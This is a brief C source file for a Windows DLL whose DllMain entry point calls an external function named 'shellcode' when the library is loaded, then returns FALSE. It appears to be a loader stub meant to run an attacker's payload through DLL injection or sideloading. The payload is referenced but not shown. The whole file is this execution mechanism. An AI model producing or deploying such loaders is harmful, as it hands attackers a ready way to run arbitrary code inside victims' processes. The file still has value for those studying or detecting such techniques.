#include <windows.h>

extern void shellcode(void);

#pragma warning( push ) 
#pragma warning( disable : 4100 )
BOOL WINAPI DllMain(HINSTANCE hInstance,DWORD fwdReason, LPVOID lpvReserved) {
  shellcode();
  return FALSE;
}
#pragma warning( pop )
